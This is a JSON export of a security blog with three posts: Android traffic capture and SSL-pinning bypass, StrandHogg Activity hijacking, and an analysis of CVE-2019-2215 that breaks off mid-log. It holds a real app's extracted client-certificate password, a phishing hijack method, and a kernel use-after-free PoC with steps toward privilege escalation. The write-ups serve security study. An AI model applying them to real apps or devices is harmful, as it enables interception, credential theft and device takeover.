{"meta":{"title":"Let_go","subtitle":null,"description":null,"author":"Let_go","url":"http://github.com"},"pages":[{"title":"","date":"2018-01-31T16:34:18.752Z","updated":"2018-01-31T16:34:18.752Z","comments":false,"path":"categories/index.html","permalink":"http://github.com/categories/index.html","excerpt":"","text":""},{"title":"All tags","date":"2018-01-31T16:19:57.000Z","updated":"2018-01-31T16:25:14.742Z","comments":true,"path":"tags/index-2.html","permalink":"http://github.com/tags/index-2.html","excerpt":"","text":""},{"title":"","date":"2018-07-27T17:51:39.999Z","updated":"2018-07-27T17:51:39.999Z","comments":false,"path":"tags/index.html","permalink":"http://github.com/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"Android APP抓包总结","slug":"Android-APP抓包总结","date":"2020-01-04T02:14:02.000Z","updated":"2020-01-05T11:51:58.814Z","comments":true,"path":"2020/01/04/Android-APP抓包总结/","link":"","permalink":"http://github.com/2020/01/04/Android-APP抓包总结/","excerpt":"","text":"Android APP抓包总结 常用的抓包工具BurpSuite_proFiddler 4Charles-proxytcpdump和wireshark用来解决不是使用HTTP/HTTPS协议传输数据的app，通过tcpdump抓包，wireshark工具解析数据包。 常规抓包流程1.首先我们需要让手机端与PC端处于同一网段（连上同一个wifi），2.在PC查看主机IP地址通过cmd窗口运行ipconfig命令即可获取。3.在手机端的wifi界面设置为手动代理，代理主机设置为PC端的IP，代理端口我们设置为8888（随便设置，只要和抓包工具一致）4.然后打开抓包工具进行抓包。 5.通过手机浏览器访问以下网址，然后下载抓包工具证书，进行证书安装BurpSuite_pro：http://burpCharles-proxy：http://chls.pro/sslFiddler：http://ipv4.fiddler:8888/ 6.抓包效果图BurpSuite_pro：Fiddler：Charles-proxy： 7.实际测试时，有些应用虽然能够抓包，但是应用端却显示访问错误的界面，应该是应用或服务器做了证书校验导致的。（关闭了Xposed+JustTrustMe就能访问了） 遇到的问题SSL pinningSSL pinning就是通过在客户端对目标服务器的证书或公钥进行锁定，这样在客户端与服务器进行交互的时候，客户端就会验证服务器发来的CA证书或公钥，如果验证通过则有效，否则无效。 服务器双向验证双向链接就是在基于SSLpinning的基础上，添加了服务端对客户端的验证。除了客户端会去验证服务端外，服务端还会去验证客户端是否有效。 如何分辨是否存在校验存在校验如何分辨属于哪种校验 SSL pinning如果抓不到包是不是就存在SLL pinning？ 因为如果客户端检测不通过那么也就不会发包了鸭，这样自然会显示失败的界面。所以我们环境正常的情况下抓不到包，并且应用显示连不上网络，那么很多可能就是SLL pinning，这样我们需要先过掉这个检测再去抓包。 双向证书校验双向证书验证时我们是能够抓到数据包的，只是服务器返回的状态码为400，原因是因为抓包工具没有发送有效的CA证书给服务器。 Bypass SSL pinning1.利用Xposed+JustTrustMe绕过单向验证2.通过Frida绕过SSL单向验证这两种方法的原理都是对客户端的验证函数进行hook，从而达到绕过验证的目的。 Bypass 双向验证因为客户端会验证服务端的证书，所以一般会把证书和证书秘钥存放在app中，我们找到服务器的CA证书并且导入到抓包工具中再进行抓包就行了 实例soul下面我们利用soul来实际操作下，我们这里使用的抓包工具是Charles-proxy，别的工具思路是一样的，只是最后导入证书的方法不一样而已。在没有绕过SSL pinning的情况下，我们会发现利用抓包工具无法对该应用的数据包进行抓取。猜测该应用可能使用了SSL pinning验证。 bypass SSL pinning不管三七二十一，我们直接利用Xposed+JustTrustMe试一下绕过单向验证，验证下我们的猜测。可以看到，由于我们开启JustTrustMe后就可以抓取到该应用的数据了，所以应该是绕过了SSL pinning，抓包结果如上图所示。接着我们从服务器返回的信息以及返回的状态码为400可以确定，该服务端应该是开启了双向验证机制的。所以我们还需要去绕过服务端的双向验证机制。 双向代理绕过在应用端查找服务器的CA证书既然客户端会对服务端的证书进行验证，那么服务端的证书肯定在客户端会保留一份，那么我们能否直接在apk中找到呢。在soul apk的assets目录下可以发现确实存在我们需要的证书。现在我们有了服务端的证书，但这还不够，因为使用该证书的时候会提示我们输入密码，我们还需要找到证书的密码，思路和刚才一样，在应用中找。 在应用端查找CA证书密码把应用apk丢到jadx中解析，然后利用该工具的搜索功能直接搜索关键字”client.p12”，可以看到确实搜索到了。然后通过向上回溯分析代码，可以知道这段代码会调用到一个getStorePassword函数，该函数是一个jni函数，通过名字我们大概可以猜想到什么。接着通过分析该函数所在的类可以知道该类会加载一个soul-netsdk动态库，那么我们就知道了getStorePassword的实现应该就在这个动态库中。从apk中找到这个动态库并丢到IDA中解析可以找到下面这个函数，可以看到该函数直接返回了一个字符串，到此为止我们得到这个字符串就是该证书的密码”soulapp123!@#1”。 导入证书到抓包工具最后我们需要把我们前面获取到的证书导入到抓包工具中，让工具使用我们提供的证书。通过以下的选项打开我们的导入窗口。Proxy -&gt; SSL Proxying Settings然后会弹出一个选项框，选中我们的证书，导入之后就是下面这样。一切顺利之后点击OK，然后再次进行抓包。 进行抓包看下结果可以看到我们成功抓到了数据包，并且也可以看到里面的内容。 实例用 JustTrustMe 干翻 SSL Pinning: 爬尤美 app 付费视频记一次APP双向认证抓包Frida 学习笔记-后面有几个例子不错 github相关工具DroidDropsDroidSSLUnpinning 相关链接扯一扯HTTPS单向认证，双向认证，抓包原理，反抓包策略深入了解解析Https - 从了解到放弃APP抓包——Xposed+JustTrustMe关闭SSL证书验证Android抓包总结安卓APP测试之HOOK大法-Frida篇安卓APP测试之双向证书认证使用OpenSSL（Windows x64版）将pem格式证书转换为p12格式添加证书导入功能以下三篇文章大同小异使用Frida绕过Android SSL Re-Pinning利用Frida绕过Certificate Pinning使用Frida绕过Android App的SSL Pinning","categories":[{"name":"Android逆向","slug":"Android逆向","permalink":"http://github.com/categories/Android逆向/"}],"tags":[{"name":"Android逆向","slug":"Android逆向","permalink":"http://github.com/tags/Android逆向/"}]},{"title":"StrandHogg漏洞-Activity劫持","slug":"StrandHogg漏洞-Activity劫持","date":"2019-12-05T07:38:52.000Z","updated":"2020-08-06T10:14:25.821Z","comments":true,"path":"2019/12/05/StrandHogg漏洞-Activity劫持/","link":"","permalink":"http://github.com/2019/12/05/StrandHogg漏洞-Activity劫持/","excerpt":"","text":"StrandHogg漏洞-Activity劫持 背景简述StrandHogg漏洞是去年12月份挪威一家APP安全公司披露了一个Android特性中存在的问题，并证明该问题已被多个恶意程序利用来进行提权，该公司还特意为该漏洞命名为StrandHogg漏洞，意为维京海盗式Android应用漏洞。其实该漏洞并不能直接绕过用户获取权限，而是利用Activity劫持伪装成正常应用通过欺骗用户来获取权限，包括android10在内的所有android版本都受该漏洞的影响。深入研究发现该问题最早在15年的USENIX安全研讨会就被提出了，研究人员从理论上描述了该漏洞的实现方法，但Google否认了其严重性。之后攻击方法被武汉大学学生发表了论文《一种新的基于APP启动模式的劫持攻击方案》。今年5月份该公司又搞出个StrandHogg漏洞2.0，本次分享主要还是StrandHogg漏洞的原理。后面有机会再分享升级版的2.0。 前置知识点Activity劫持该漏洞的利用本质其实就是Activity劫持，简单来说就是当用户打开正常应用的Activity时，恶意的应用利用它自己实现的Activity覆盖掉正常应用的Activity，实现对用户的欺骗，从而达到我们想要的目的。常用于劫持正常登录页面欺骗用户达到获取用户账号密码的效果。在讲解该漏洞原理之前我们先来简单看下该漏洞涉及到的一些知识点。 Activity状态转换首先是Activity，Activity是Android组件中最基本也是最常见的四大组件之一。在一个Android应用中，一个Activity通常就是一个单独的屏幕，上面可以显示一些控件也可以监听并处理用户触发的事件。一个Activity共有4种状态，分别是运行，暂停，停止与销毁。 运行状态就是当Activity处于屏幕前台时，我们能与之交互的状态，此时的Activity处于活动栈的最顶端。 暂停状态则是当Activity失去焦点时，但部分界面用户仍然可见时的状态。 停止状态是当前Activity完全被另一个Activity覆盖掉的状态，此时的Activity我们是不可见的。 当一个Activity被关闭时进入销毁状态，一般是由用户操作或内存不足时系统强制销毁所致。 通过下面的这张图我们看下几种状态之间的互相转换以及每种状态转换时会触发的函数。一个Activity的状态转换流程如下：Activity相关的七个生命周期函数，分别为onCreate()，onRestart()，onStart()，onReusme()，onPause()，onStop()，onDestory()。 Task任务，Activity栈然后是任务(Task)的概念，任务就是一些相关联的Activity的集合，当我们打开手机的任务管理器时，界面上显示的就是一个个任务。一个任务中的Activity可以来自不同的应用程序。比如程序A的Activity打开程序B的一个Activity，这两个Activity都会保存在一个任务中，这样实现是为了更好的用户体验。每个任务中的Activity都是以栈的方式(后进先出)进行管理。我们称这个栈叫活动栈，所有Activity都保存在栈中，以便用户点击”后退”按钮时导航到之前的Activity恢复执行。屏幕上始终显示栈顶部的Activity，我们称它为前台Activity，与之关联的任务是前台任务，因此一次只能有一个前台任务，其他的任务都属于后台任务。当任务被切换到后台时，任务中的所有Activity都会停止，并在任务的活动栈中保持不变，这样当用户再次打开该任务时就可以从上次停止的位置接着运行。这里需要注意的地方就是虽然在android中存在沙箱机制每个应用都受到android沙箱的保护，但来自不同应用程序的Activity可以共存于同一任务中，这给我们劫持Activity提供了机会。android沙箱：该机制主要基于linux的用户权限保护和进程隔离实现的，每个应用对应一个用户，不同应用间相互隔离，只能访问属于自己的资源，不能访问其他应用的数据。 taskAffinity(任务相关性)(也就是通过该参数来控制恶意Activity去劫持哪个页面)与任务相关的一个属性叫做taskAffinity(任务相关性)，在manifest中可以指定这个属性的值，该属性用来标识一个Activity所需要的任务名称。如果在manifest文件中注册Activity时不明确指定taskAffinity属性那么默认该Activity所需任务的名字就是所属应用的包名。所以默认情况下一个app中所有Activity都在同一个task中。当Activity设置了taskAffinity属性，那么这个Activity在被创建时就会运行在和taskAffinity相同的任务中，如果没找到该任务，就新建taskAffinity指定的任务，并将该Activity添加到其中。一般该属性都是和singleTask模式或allowTaskReparenting属性配合使用，其他情况下没什么意义。 4种启动模式最后来看下Activity启动的4种模式，不同模式实现的效果会不一样。standard模式(默认启动模式)：这种模式下Activity可以有多个实例，无论任务栈中是否已经存在该Activity的实例都会创建一个新的Activity实例。singleTop模式(栈顶复用模式)：该模式与Standard模式有些类似，区别在于如果需要启动的Activity在栈顶，不会创建新的实例只是调用该Activity的onNewIntent方法。如果不在栈顶则会创建新的实例。singleTask模式(栈内复用模式)：这种模式同一个Task内只有一个实例，如果Activity已经位于栈顶，那么系统就不会再创建新的Activity实例，和singleTop一样。但如果Activity存在但不位于栈顶则会将该Activity移到栈顶，并将它上面的Activity出栈。singleInstance模式(单例模式)：这种模式也是单例模式，但和SingleTask模式不一样，singleInstance的Activity不予许自己的task中存在其他的Activity实例，也就是该模式的Activity应用是task中唯一的Activity实例。 攻击思路和模型攻击思路有了上面的基础知识现在我们来看看如何实现我们想要的Activity劫持。这里有两种情况可以达到我们的效果，首先我们假设有两个应用，分别是恶意应用A，受害者应用B，对应的是劫持页面Malware-Activity-A，任务名为Task-A，被劫持页面Target-Activity-A，任务名为Task-B。 第一种情况当受害者应用B中被劫持页面Target-Activity-A的android:launchMode=”standard”或”singleTop”时，我们可以把恶意应用A中用来做劫持页面Malware-Activity-A的taskAffinity属性值设置为与被劫持页面Target-Activity-A的taskAffinity值一致(Task-B)，并且把劫持页面Malware-Activity-A的allowTaskReparenting属性设置为true，这样当受害者应用B启动时，用来劫持的Malware-Activity-A就会从启动它的Task-A转换为受害者应用的Task-B的栈顶进行显示。从而完成我们Activity劫持的效果。不过allowTaskReparenting有个问题，就是只有当Affinity定义的需要转移的Task-B创建时，才会触发重新设置Task的操作，所以这种攻击恶意应用A必须在受害者应用B启动之前就启动，否则劫持就会失败。解决的方法就是启动Malware-Activity-A的时候通过设置FLAG_ACTIVITY_NEW_TASK属性来实现劫持，该属性的效果是如果Affinity设置的Task已经存在，则直接将Activity添加到该Task中，如果不存在则创建一个新的Task，并将Activity添加进去。这样就避免第一种情况恶意应用A后启动导致没法加入到Task-B的问题。 第二种情况当受害者应用B中被劫持Target-Activity-A的android:launchMode=”singleInstance”时，由于该模式属于单例模式，不允许自己的Task中存在其他的Activity实例，每次singleInstance属性的Activity启动时无论后台是否存在同名的Task，系统都会创建一个新的Task并将当前的Activity添加到该任务的Activity栈中，之后不可再给该任务添加别的Activity，该任务一直以单Activity的形式存在。但这有个问题就是如果后台不存在同名任务，那么该流程属于正常流程。一旦存在同名任务，系统仍然会创建一个新的Task并赋予不同的Taskid，这就导致系统中存在两个同Task名但不同id的Task，而系统运行任务列表又只会显示最近运行的任务，这就给人一种两者位于同一任务的错觉。 攻击模型现在我们来看下利用上面讲到的知识如何去实现一个Activity劫持。android:launchMode=”standard” + android:allowTaskReparenting=”true”劫持（伪造task，当目标应用启动时，会显示恶意Activity），点击返回后进入目标正常Activity如果目标应用先启动的话则劫持失败[视频演示-1.mp4] android:launchMode=”standard” + Intent.FLAG_ACTIVITY_NEW_TASK(android:launchMode=”singleTask”)劫持（伪造task，当目标应用启动时，会显示恶意Activity），点击返回后直接退出到桌面如果目标应用先启动的话仍然可以劫持，点击返回后进入目标正常Activity[视频演示-2-1.mp4] [视频演示-2-2.mp4] android:launchMode=”singleInstance”劫持（创建一个与目标应用Task名一致但id不一样的新Task，由于系统运行任务列表只显示最近运行的任务，所以在任务列表中就看不到正常应用的Task，给人的感觉就像是被劫持一样）[视频演示-3.mp4] 应用场景Activity劫持-网络钓鱼通过伪造一个与目标Activity一样的恶意Activity比如用户登录界面，充值页面等，当用户点开目标界面时通过上述提到的方法去劫持调目标Activity从而欺骗用户达到钓鱼效果。 防卸载，勒索等大概的意思就是通过Activity的excludeFromRecents属性把恶意应用的Activity隐藏起来，然后通过监控任务来一直启动恶意Activity避免Activity被关闭，这样每次点击正常目标应用显示的都会是恶意Activity，从而达到防卸载，拒绝打开目标应用的效果，感觉其实和上面的原理还是一样的。 防护措施由于该问题属于android设计上的一个缺陷所以目前对于这类劫持还没有比较好的防御方案，不过可以适当给用户一些警告，比如提示用户登录界面被覆盖，应用被切换到后台之类的提示。避免用户把恶意的Activity当做正常的页面使用。通过对应用顶层Activity监控，使用白名单机制避免别的应用覆盖本应用的页面。 参考9.0源码分析源码分析源码分析-比较详细一种新的基于APP启动模式的劫持攻击方案Android启动模式和taskAffinity属性详解安卓特性漏洞重浮水面，已被多个恶意应用利用","categories":[{"name":"Vulnerability","slug":"Vulnerability","permalink":"http://github.com/categories/Vulnerability/"}],"tags":[{"name":"Android_System","slug":"Android-System","permalink":"http://github.com/tags/Android-System/"}]},{"title":"CVE-2019-2215","slug":"CVE-2019-2215","date":"2019-10-08T03:34:52.000Z","updated":"2019-11-20T04:25:36.091Z","comments":true,"path":"2019/10/08/CVE-2019-2215/","link":"","permalink":"http://github.com/2019/10/08/CVE-2019-2215/","excerpt":"","text":"CVE-2019-2215 背景该漏洞由Google公司的Project Zero小组于2017年末发现，2018年初修复了该漏洞，但2019年9被Google公司的分析小组（TAG）发现较新的android上依然存在该漏洞并确认已应用在实际攻击中。并分配CVE编号CVE-2019-2215。 漏洞成因前置知识select函数主要用来监视文件描述符的变化情况，多用于实现非阻塞socket。poll函数和select实现的功能差不多，但poll效率更高，作用是把当前的文件描述符挂到等待队列。在2.5.44版本后，poll被epoll取代。epoll机制是Linux内核为了处理大批量文件描述符而作了改进的poll，它显著提高了程序在大量并发连接中只有少量活跃的情况下cpu的利用率。epoll相关的系统调用如下：1234epoll_create:用来创建一个epoll文件描述符。epoll_ctl:用来添加/修改/删除需要侦听的文件描述符。epoll_wait:接受发生在被监听的描述符上的，用户感兴趣的IO事假。close：关闭epoll文件描述符。 epoll_ctl函数的控制码如下：123EPOLL_CTL_ADD:在epoll实例上注册目标文件描述符fd。EPOLL_CTL_MOD:更改与目标文件描述符fd相关的事件。EPOLL_CTL_DEL:从epoll实例中删除目标文件描述符fd。 漏洞描述首先我们来看下该漏洞的描述，Android内核的binder驱动中的释放后重引用漏洞。成功利用该漏洞可实现本地权限升级。漏洞成因是我们通过epool_ctl选项EPOLL_CTL_ADD监听binder描述符时，会触发底层函数binder_poll分配一个binder_thread结构体并通过poll_wait函数把binder_thread结构体中的wait元素的地址添加到epoll机制的等待队列中。当别的线程使用BINDER_THREAD_EXIT选项退出binder句柄时，底层函数会去释放掉前面创建的binder_thread结构体的内存，但并不会从相应的等待队列中删除对binder_thread-&gt;wait的引用，导致程序退出时epoll清理代码使用binder_thread-&gt;wait元素时由于binder_thread结构体已经被释放而导致释放后重引用。 Poc下面是作者给出的poc1234567891011121314#include &lt;fcntl.h&gt;#include &lt;sys/epoll.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;unistd.h&gt;#define BINDER_THREAD_EXIT 0x40046208ulint main()&#123; int fd, epfd; struct epoll_event event = &#123; .events = EPOLLIN &#125;; fd = open(\"/dev/binder0\", O_RDONLY); epfd = epoll_create(1000); epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &amp;event); /* 触发binder_poll去分配binder_thread结构体 */ ioctl(fd, BINDER_THREAD_EXIT, NULL); /* 触发释放binder_thread结构体 */&#125; /* 程序运行结束 会触发清理epoll的代码,导致释放后重引用 */ 漏洞原理大概了解了该漏洞的原理之后，我们来具体分析一下该漏洞，原理挺简单，搞懂UAF我们需要明白3个问题，内存在哪申请，内存在哪释放以及内存在哪重引用。搞清楚这三个问题那么我们也就算搞明白了这个漏洞了。 内存的申请先来看内存的申请，触发链如下：epoll_ctl:EPOLL_CTL_ADD -&gt; ep_insert -&gt; ep_item_poll -&gt; binder_poll -&gt; binder_get_thread1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859static unsigned int binder_poll(struct file *filp, struct poll_table_struct *wait)&#123; struct binder_proc *proc = filp-&gt;private_data; struct binder_thread *thread = NULL; bool wait_for_proc_work; thread = binder_get_thread(proc); /*获取thread内存*/ if (!thread) return POLLERR; binder_inner_proc_lock(thread-&gt;proc); thread-&gt;looper |= BINDER_LOOPER_STATE_POLL; wait_for_proc_work = binder_available_for_proc_work_ilocked(thread); binder_inner_proc_unlock(thread-&gt;proc); poll_wait(filp, &amp;thread-&gt;wait, wait); /*添加thread-&gt;wait到等待队列*/ if (binder_has_work(thread, wait_for_proc_work)) return POLLIN; return 0;&#125;static struct binder_thread *binder_get_thread(struct binder_proc *proc)&#123; struct binder_thread *thread; struct binder_thread *new_thread; binder_inner_proc_lock(proc); thread = binder_get_thread_ilocked(proc, NULL); binder_inner_proc_unlock(proc); if (!thread) &#123; new_thread = kzalloc(sizeof(*thread), GFP_KERNEL); /*申请内存*/ if (new_thread == NULL) return NULL; binder_inner_proc_lock(proc); thread = binder_get_thread_ilocked(proc, new_thread); /*初始化并把new_thread赋值给thread*/ binder_inner_proc_unlock(proc); if (thread != new_thread) kfree(new_thread); &#125; return thread; /*返回新申请的内存*/&#125;poll_wait中的回调函数static void ep_ptable_queue_proc(struct file *file, wait_queue_head_t *whead, poll_table *pt)&#123; struct epitem *epi = ep_item_from_epqueue(pt); struct eppoll_entry *pwq; if (epi-&gt;nwait &gt;= 0 &amp;&amp; (pwq = kmem_cache_alloc(pwq_cache, GFP_KERNEL))) &#123; init_waitqueue_func_entry(&amp;pwq-&gt;wait, ep_poll_callback); pwq-&gt;whead = whead; /*赋值-这里是关键，因为重引用的时候就是通过pwq-&gt;whead获取的内存*/ pwq-&gt;base = epi; if (epi-&gt;event.events &amp; EPOLLEXCLUSIVE) add_wait_queue_exclusive(whead, &amp;pwq-&gt;wait); else add_wait_queue(whead, &amp;pwq-&gt;wait); list_add_tail(&amp;pwq-&gt;llink, &amp;epi-&gt;pwqlist); epi-&gt;nwait++; &#125; else &#123; /* We have to signal that an error occurred */ epi-&gt;nwait = -1; &#125;&#125; 当我们在用户态使用epoll_ctl函数并且使用EPOLL_CTL_ADD选项时，则可以触发到内核底层binder_poll函数。该函数首先通过binder_get_thread函数去申请一个binder_thread结构体，获取成功之后通过poll_wait函数把binder_thread结构体的wait成员添加到epoll等待队列中(注意这里的添加操作)，到此内存分配的流程我们分析完了。涉及到的binder_thread结构体123456789101112131415161718192021222324struct binder_thread &#123; struct binder_proc *proc; struct rb_node rb_node; struct list_head waiting_thread_node; int pid; int looper; bool looper_need_return; struct binder_transaction *transaction_stack; struct list_head todo; bool process_todo; struct binder_error return_error; struct binder_error reply_error; wait_queue_head_t wait; struct binder_stats stats; atomic_t tmp_ref; bool is_dead; struct task_struct *task;&#125;;struct __wait_queue_head &#123; spinlock_t lock; struct list_head task_list;&#125;;typedef struct __wait_queue_head wait_queue_head_t; 然后来看下在何时对binder_thread结构体内存进行的释放，通过binder句柄的ioctl接口传入BINDER_THREAD_EXIT选项即可触发内核对binder_thread的释放：binder_ioctl:BINDER_THREAD_EXIT -&gt; binder_thread_release -&gt; binder_thread_dec_tmpref -&gt; binder_free_thread -&gt; kfree12345678static void binder_free_thread(struct binder_thread *thread)&#123; BUG_ON(!list_empty(&amp;thread-&gt;todo)); binder_stats_deleted(BINDER_STAT_THREAD); binder_proc_dec_tmpref(thread-&gt;proc); put_task_struct(thread-&gt;task); kfree(thread);&#125; 最后再来看一下binder_thread结构体内存在哪做了重引用了：.release -&gt; ep_eventpoll_release -&gt; ep_free -&gt; ep_unregister_pollwait -&gt; ep_remove_wait_queue -&gt; remove_wait_queue123456789static void ep_remove_wait_queue(struct eppoll_entry *pwq)&#123; wait_queue_head_t *whead; rcu_read_lock(); whead = smp_load_acquire(&amp;pwq-&gt;whead); if (whead) remove_wait_queue(whead, &amp;pwq-&gt;wait); rcu_read_unlock();&#125; 在对epoll句柄做release操作时会调用到ep_eventpoll_release函数，底层会执行到ep_remove_wait_queue函数，函数内通过pwq-&gt;whead获取到前面的binder_thread结构体的wait成员，然后执行链表删除操作。因为前面已经释放了binder_thread结构体，所以这里的wait引用就是释放后重引用。后来通过对内核代码的分析知道我们也可以通过epoll_ctl函数的EPOLL_CTL_DEL选项去主动触发ep_eventpoll_release的调用触发释放后重引用，调用链如下。epoll_ctl:EPOLL_CTL_DEL -&gt; ep_remove -&gt; ep_unregister_pollwait -&gt; ep_remove_wait_queue -&gt; remove_wait_queue从等待队列中删除一个节点的流程如下：1234567&lt;4&gt;[ 134.391555] c3 2145&lt;4&gt;[ 134.391555] c3 2145 -1-[cve_2215_poc]- binder_poll- &amp;thread-&gt;wait:0xffffffebc7020020&lt;4&gt;[ 134.391555] c3 2145&lt;4&gt;[ 134.391555] c3 2145 -1-[cve_2215_poc]- remove_wait_queue- q:0xffffffebc7020020 q-&gt;lock:0x30002 q-&gt;task_list:0xffffffebc7020028 q-&gt;task_list.next:0xffffffeb3516be60 q-&gt;task_list.prev:0xffffffeb3516be60 (q+0x18):0xffffffebb923b800&lt;4&gt;[ 136.605430] c3 2145 -2-[cve_2215_poc]- remove_wait_queue- wait-&gt;task_list:0xffffffeb3516be60 task_list.next:0xffffffebc7020028 task_list.prev:0xffffffebc7020028&lt;4&gt;[ 136.608541] c3 2145 -3-[cve_2215_poc]- remove_wait_queue- q:0xffffffebc7020020 q-&gt;lock:0x30002 q-&gt;task_list:0xffffffebc7020028 q-&gt;task_list.next:0xffffffebc7020028 q-&gt;task_list.prev:0xffffffebc7020028 (q+0x18):0xffffffebb923b800&lt;4&gt;[ 136.609702] c3 2145 -4-[cve_2215_poc]- remove_wait_queue- wait-&gt;task_list:0xffffffeb3516be60 task_list.next:0xdead000000000100 task_list.prev:0xdead000000000200 12345678910111213141516171819202122void remove_wait_queue(wait_queue_head_t *q, wait_queue_t *wait)&#123; unsigned long flags; spin_lock_irqsave(&amp;q-&gt;lock, flags); __remove_wait_queue(q, wait); spin_unlock_irqrestore(&amp;q-&gt;lock, flags);&#125;static inline void__remove_wait_queue(wait_queue_head_t *head, wait_queue_t *old)&#123; list_del(&amp;old-&gt;task_list);&#125;static inline void list_del(struct list_head *entry)&#123; __list_del(entry-&gt;prev, entry-&gt;next); entry-&gt;next = LIST_POISON1; entry-&gt;prev = LIST_POISON2;&#125;void __list_del(struct list_head *prev, struct list_head *next)&#123; next-&gt;prev = prev; prev-&gt;next = next;&#125; 总结一下触发流程：binder_thread申请-&gt;binder_thread释放-&gt;binder_thread-&gt;wait重引用 补丁用意linux补丁官网上在2017年12月份就修复了，但是怎么android又报了出来呢？Syzboot日志https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/commit/drivers/android/binder.c?h=linux-4.14.y&amp;id=7a3cee43e935b9d526ad07f20bf005ba7e74d05b如果这个线程使用了poll，确保我们从任何epoll的数据结构中移除带有POLLFREE的等待队列，waitqueue_active是安全的，因为我们要保持内锁在这里使用。 漏洞利用漏洞利用思路下面参考着文末贴出的Exp分析一下该漏洞的利用思路，利用分两步：1.通过漏洞获取当前进程的task_struct地址。2.利用前面获取的task_struct计算出进程limit的值，通过漏洞修改进程limit的值，实现内核的任意读写。 泄漏task_struct地址内核地址读，思路：首先利用BINDER_THREAD_EXIT选项触发binder_thread结构体的释放，接着创建一对pipe读写句柄，利用聚合写writev函数对pipefd[1]进行写操作，写入一组我们准备好的iovec数组到内核态去占位前面释放的binder_thread结构体。因为其中有两个iovec结构体刚好能与释放的binder_thread-&gt;wait元素重合，所以使用epoll_ctl的EPOLL_CTL_DEL选项触发重引用的链表删除操作时，刚好可以把重合的第二个iovec结构体的iovec.iov_base的值改为binder_thread-&gt;wait.task_list的地址。此时用户态通过read去读取数据时，实际读取的就是iovec.base指向的内存，这样就可以从binder_thread-&gt;wait.task_list开始读取。读取的长度由iovec-&gt;iov_len控制，该长度由我们可控，这就实现了内核读的效果。1234struct iovec&#123; void __user *iov_base; __kernel_size_t iov_len;&#125;; 来看一下具体实现：1234567&lt;4&gt;[ 188.781784] c3 4058&lt;4&gt;[ 188.781784] c3 4058 -1-[cve_2215_poc]- binder_poll- &amp;thread-&gt;wait:0xffffffd7b7a3dea0&lt;4&gt;[ 188.781784] c3 4058&lt;4&gt;[ 188.781784] c3 4058 -1-[cve_2215_poc]- remove_wait_queue- q:0xffffffd7b7a3dea0 q-&gt;lock:0x100010000 q-&gt;task_list:0xffffffd7b7a3dea8 q-&gt;task_list.next:0x1000 q-&gt;task_list.prev:0xdeadbeef (q+0x18):0x1000&lt;4&gt;[ 190.809424] c3 4058 -2-[cve_2215_poc]- remove_wait_queue- wait-&gt;task_list:0xffffffd86c38ed20 task_list.next:0xffffffd7b7a3dea8 task_list.prev:0xffffffd7b7a3dea8&lt;4&gt;[ 190.809471] c3 4058 -3-[cve_2215_poc]- remove_wait_queue- q:0xffffffd7b7a3dea0 q-&gt;lock:0x100010000 q-&gt;task_list:0xffffffd7b7a3dea8 q-&gt;task_list.next:0xffffffd7b7a3dea8 q-&gt;task_list.prev:0xffffffd7b7a3dea8 (q+0x18):0x1000&lt;4&gt;[ 190.809498] c3 4058 -4-[cve_2215_poc]- remove_wait_queue- wait-&gt;task_list:0xffffffd86c38ed20 task_list.next:0xdead000000000100 task_list.prev:0xdead000000000200 以上是调试数据，可以看到当执行到remove_wait_queue的时候，参数q指向的task_list地址为0xffffffd7b7a3dea0，正好就是binder_poll中thread-&gt;wait的首地址，并且根据q-&gt;lock的内容为0x100010000可以确定我们用户态数据的占位是成功的，参数wait指向的task_list地址为0xffffffd86c38ed20，wait-&gt;task_list.next与wait-&gt;task_list.next都指向q-&gt;task_list，因为这task_list链表只有两个节点，所以通过链表删除操作之后则把q-&gt;task_list.next和q-&gt;task_list.prev都改为了0xffffffd7b7a3dea8(q-&gt;task_list的地址)，而task_list.next，task_list.prev分别对应上与binder_thread-&gt;wait重叠的第一个iovec的iov_len元素以及第二个iovec的iov_base，最后当用户态read的时候就会从第二个iovec的iov_base(0xffffffd7b7a3dea8)开始读iovec.iov_len的长度到用户态内存，这样我们就成功泄漏了内核数据，泄漏的数据偏移0xe8(pxiel2上面)刚好就是当前进程的task_struct结构体的地址。 修改limit值内核地址任意写，思路：通过上一步的内核读有了当前进程的task结构体那么下一步怎么提权呢？此时还需要构造一个内核写，通过内核写去修改进程limit的值，这样就能实现内核任意地址读写的效果。首先还是需要先触发binder_thread结构体的释放。不过这次是通过socketpair函数创建一对匿名已连接套接字，通过recvmsg函数对socks[0]做接收操作，传入的参数2是一个msghdr结构体，msghdr.msg_iov指向的是我们准备好的iovec数组，让这组iovec数组去内核中占位前面释放的binder_thread结构体。iovec数组中有两个iovec刚好能与binder_thread-&gt;wait元素重合，然后使用epoll_ctl的EPOLL_CTL_DEL选项触发重引用的链表删除操作，把重合的第二个iovec结构体的iovec.iov_base的值改为binder_thread-&gt;wait.task_list的地址，再利用用户态调用write函数把需要覆盖的数据写入到socks[1]。当socks[1]中有数据的时候，recvmsg则把读取到的数据写入到iovec数组的每个iovec结构体的iov_base指向的内存，因为前面已经利用漏洞把重合的第二个iovec结构体的iovec.iov_base修改成了binder_thread-&gt;wait.task_list的地址，所以这里会直接把伪造数据写入到binder_thread-&gt;wait.task_list的地址，从而实现对指定内核地址写的操作。123456789struct msghdr &#123; void *msg_name; /* ptr to socket address structure */ int msg_namelen; /* size of socket address structure */ struct iovec *msg_iov; /* scatter/gather array */ __kernel_size_t msg_iovlen; /* # elements in msg_iov */ void *msg_control; /* ancillary data */ __kernel_size_t msg_controllen; /* ancillary data buffer length */ unsigned int msg_flags; /* flags on received message */&#125;; 具体实现：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263&lt;4&gt;[ 1150.931303] c3 4164 -1-[cve_2215_poc]- binder_poll- &amp;thread-&gt;wait:0xffffffcc03dfeca0&lt;4&gt;[ 1150.931303] c3 4164 -1-[cve_2215_poc]- unix_stream_read_generic-&gt;&gt;&gt;&gt;&lt;4&gt;[ 1150.932519] c3 4164 -1-[cve_2215_poc]- skb_copy_datagram_iter-&gt;&gt;&gt;&gt;&lt;4&gt;[ 1150.932593] c3 4164&lt;4&gt;[ 1150.932593] c3 4164 -1-[cve_2215_poc]- copy_to_iter- addr:58 bytes:0x1 i-&gt;count:0x31 i-&gt;iov:0xffffffcc03dfec00 i-&gt;nr_segs:0x19 &lt;4&gt;[ 1150.932650] c3 4164 